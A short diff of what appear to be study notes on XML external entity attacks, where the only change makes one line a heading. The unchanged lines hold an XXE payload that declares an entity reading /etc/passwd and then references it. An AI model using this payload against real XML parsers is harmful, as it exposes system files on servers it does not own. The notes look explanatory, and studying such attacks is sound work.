@@ -2,7 +2,7 @@
 
 
 
- it is work like this 
+ # it is work like this 
  
  1. <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ] >
  2. and  we call by this   &xxe;
